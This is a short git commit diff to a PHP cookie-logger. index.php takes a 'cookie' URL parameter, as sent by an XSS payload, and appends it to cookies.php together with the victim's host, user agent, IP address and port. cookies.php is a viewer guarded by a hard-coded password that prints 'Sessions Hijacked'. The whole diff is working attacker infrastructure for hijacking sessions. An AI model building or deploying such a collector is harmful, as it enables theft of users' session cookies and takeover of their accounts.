be1655acd550db0a619082cf28e12430999c6421
homdreen <fehmel@gmail.com>
2019-03-03 23:59:26 -0300

    todo send email

--- cookies.php
+++ cookies.php
@@ -1,5 +1,25 @@
 <?php
     if($_GET['pass'] != 'teste'){
         die("<strong>Get out of Here!</strong>");
+    }else{
+        echo "<strong>Sessions Hijacked</strong>";
     }
 ?>
+
+<head>
+    <style>
+        table, tr, th, td { 
+            border: 1px solid black;
+            border-collapse:collapse;
+            padding: 3px;
+        }
+        th, td {
+            padding: 1px 15px;
+        }
+        table {
+            width: 100%;
+            margin: 10px 0;
+        }
+    </style>
+</head>
+
--- index.php
+++ index.php
@@ -1,8 +1,21 @@
 <?php
     if(isset($_GET['cookie'])) {
+        $arr = array('HTTP_HOST', 'HTTP_USER_AGENT', 'SERVER_NAME', 'REMOTE_ADDR', 'REQUEST_METHOD', 'REMOTE_PORT');
+        
         $file = fopen('cookies.php', 'a+');
-        fwrite($file, $_GET['cookie'] . PHP_EOL);
+       
+        $dataToWrite = "<table><tr><th>Host</th><th>User Agent</th><th>Server Name</th><th>Remote Addr</th><th>Request Method</th><th>Remote Port</th><th>Cookie</th><tr>";
+
+        foreach($arr as $property){
+            $data = '<td>'. $_SERVER[$property] . '</td>';
+            $dataToWrite .= $data;
+        }
+
+        $dataToWrite .= '<td>' . $_GET['cookie'] . '</td></tr></table><hr>';
+
+        fwrite($file, $dataToWrite . PHP_EOL);
         fclose($file);
+
         echo 'OK';
     }
     else{
